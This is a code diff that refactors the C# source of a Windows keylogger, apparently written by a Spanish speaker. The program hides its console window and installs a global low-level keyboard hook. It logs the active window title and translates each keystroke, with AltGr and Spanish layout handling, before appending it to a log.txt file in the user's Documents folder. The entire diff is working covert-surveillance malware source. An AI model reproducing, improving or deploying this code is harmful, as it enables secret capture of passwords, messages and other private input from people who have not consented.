@@ -8,32 +8,40 @@ using System.Windows.Forms;
 
 class KeyLogger
 {
+    /* ----------  Campos ---------- */
     const int WH_KEYBOARD_LL = 13;
     const int WM_KEYDOWN     = 0x0100;
+
+    const int VK_SHIFT   = 0x10;
+    const int VK_CAPITAL = 0x14;
+    const int VK_MENU    = 0x12;   // Alt
+    const int VK_CONTROL = 0x11;   // Ctrl
+    const int VK_RMENU   = 0xA5;   // AltGr
 
     static StreamWriter log;
     static IntPtr hook;
     static string lastWindow = "";
 
+    /* ----------  Main ---------- */
     [STAThread]
     static void Main()
     {
-        // Ocultar consola
-        ShowWindow(GetConsoleWindow(), 0);
+        ShowWindow(GetConsoleWindow(), 0);                    // ocultar consola
 
-        string logPath = Path.Combine(
+        string path = Path.Combine(
             Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
             "log.txt");
-        log = new StreamWriter(new FileStream(logPath, FileMode.Append, FileAccess.Write));
+        log = new StreamWriter(new FileStream(path, FileMode.Append, FileAccess.Write));
         log.AutoFlush = true;
 
         hook = SetHook(HookCallback);
-        Application.Run();
+        Application.Run();                                    // bucle de mensajes
         UnhookWindowsHookEx(hook);
         log.Close();
     }
 
-    /* ------------ Hook ------------ */
+    /* ----------  Hook global ---------- */
+    delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
     static IntPtr SetHook(LowLevelKeyboardProc proc)
     {
@@ -45,8 +53,6 @@ class KeyLogger
         }
     }
 
-    delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
-
     static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
     {
         if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
@@ -54,9 +60,9 @@ class KeyLogger
             int vk = Marshal.ReadInt32(lParam);
 
             /* Ventana activa */
-            StringBuilder sbWin = new StringBuilder(256);
-            GetWindowText(GetForegroundWindow(), sbWin, sbWin.Capacity);
-            string win = sbWin.ToString();
+            StringBuilder winSb = new StringBuilder(256);
+            GetWindowText(GetForegroundWindow(), winSb, winSb.Capacity);
+            string win = winSb.ToString();
             if (win != lastWindow)
             {
                 lastWindow = win;
@@ -65,36 +71,37 @@ class KeyLogger
                               "] Ventana: " + win);
             }
 
-            /* Estado de teclas */
+            /* Estado de teclado */
             byte[] ks = new byte[256];
             GetKeyboardState(ks);
 
             if ((GetKeyState(VK_SHIFT) & 0x8000) != 0)   ks[VK_SHIFT]   = 0x80;
             if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0) ks[VK_CAPITAL] = 0x01;
 
-            bool altgr = (GetKeyState(VK_RMENU) & 0x8000) != 0;
-            if (altgr)
+            bool altGr = (GetKeyState(VK_RMENU) & 0x8000) != 0;
+            if (altGr)
             {
                 ks[VK_RMENU]   = 0x80;
                 ks[VK_MENU]    = 0x80;
                 ks[VK_CONTROL] = 0x80;
             }
 
+            /* Traducir tecla */
             StringBuilder buf = new StringBuilder(5);
             int r = ToUnicodeEx((uint)vk, 0, ks, buf, buf.Capacity, 0,
                                 GetKeyboardLayout(0));
-            string raw = buf.ToString();
-            string key = Translate(vk, raw, altgr);
 
+            string raw = buf.ToString();
+            string key = Translate(vk, raw, altGr);
             log.Write(key);
         }
         return CallNextHookEx(hook, nCode, wParam, lParam);
     }
 
-    /* ------------ Traducción ------------ */
-
-    static string Translate(int vk, string raw, bool altgr)
+    /* ----------  Traducción ---------- */
+    static string Translate(int vk, string raw, bool altGr)
     {
+        /* Salida válida de ToUnicodeEx */
         if (!string.IsNullOrEmpty(raw) &&
             !char.IsControl(raw[0]) &&
             raw[0] != 0xFFFF)
@@ -109,8 +116,8 @@ class KeyLogger
             return raw;
         }
 
-        /* AltGr mapeos manuales */
-        if (altgr)
+        /* AltGr manual */
+        if (altGr)
         {
             switch (vk)
             {
@@ -123,16 +130,15 @@ class KeyLogger
                 case 56:  return "["; // AltGr+8
                 case 57:  return "]"; // AltGr+9
                 case 48:  return "}"; // AltGr+0
-                case 226: return "\\";// AltGr+º/OEM102
+                case 226: return "\\";// AltGr+º / OEM102
             }
         }
 
-        /* Dead keys y OEM habituales */
+        /* Dead keys y otros OEM */
         switch (vk)
         {
             case 192: return "^";
             case 222: return "´";
-            case 186: return "ñ";
             case 160:
             case 161: return "[SHIFT]";
             case 162:
@@ -145,6 +151,7 @@ class KeyLogger
             case 27:  return "[ESC]";
             case 8:   return "[BACKSPACE]";
             case 32:  return "[SPACE]";
+            case 186: return "ñ";
             case 187: return "=";
             case 189: return "-";
             case 188: return ",";
@@ -155,8 +162,7 @@ class KeyLogger
         }
     }
 
-    /* ------------ P/Invoke ------------ */
-
+    /* ----------  P/Invoke ---------- */
     [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(
         int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
     [DllImport("user32.dll")] static extern bool   UnhookWindowsHookEx(IntPtr hhk);
@@ -164,23 +170,15 @@ class KeyLogger
         IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
     [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string name);
     [DllImport("kernel32.dll")] static extern IntPtr GetConsoleWindow();
-    [DllImport("user32.dll")] static extern bool   ShowWindow(IntPtr hWnd, int nCmdShow);
-    [DllImport("user32.dll")] static extern IntPtr GetForegroundWindow();
+    [DllImport("user32.dll")]   static extern bool   ShowWindow(IntPtr hWnd, int nCmdShow);
+    [DllImport("user32.dll")]   static extern IntPtr GetForegroundWindow();
     [DllImport("user32.dll", CharSet = CharSet.Auto)]
         static extern int GetWindowText(IntPtr hWnd, StringBuilder s, int n);
-    [DllImport("user32.dll")] static extern bool   GetKeyboardState(byte[] ks);
-    [DllImport("user32.dll")] static extern short  GetKeyState(int nVirtKey);
-    [DllImport("user32.dll")] static extern IntPtr GetKeyboardLayout(uint idThread);
-    [DllImport("user32.dll")] static extern int    ToUnicodeEx(
-        uint wVk, uint wScan, byte[] lpKeyState,
-        [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff,
-        int cchBuff, uint wFlags, IntPtr dwhkl);
-
-    /* ------------ Constantes ------------ */
-
-    const int VK_SHIFT   = 0x10;
-    const int VK_CAPITAL = 0x14;
-    const int VK_MENU    = 0x12;  // Alt
-    const int VK_CONTROL = 0x11;
-    const int VK_RMENU   = 0xA5;  // AltGr
+    [DllImport("user32.dll")]   static extern bool   GetKeyboardState(byte[] ks);
+    [DllImport("user32.dll")]   static extern short  GetKeyState(int vKey);
+    [DllImport("user32.dll")]   static extern IntPtr GetKeyboardLayout(uint idThread);
+    [DllImport("user32.dll")]   static extern int    ToUnicodeEx(
+        uint wVk, uint wScan, byte[] ks,
+        [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder buf,
+        int cch, uint flags, IntPtr dwhkl);
 }
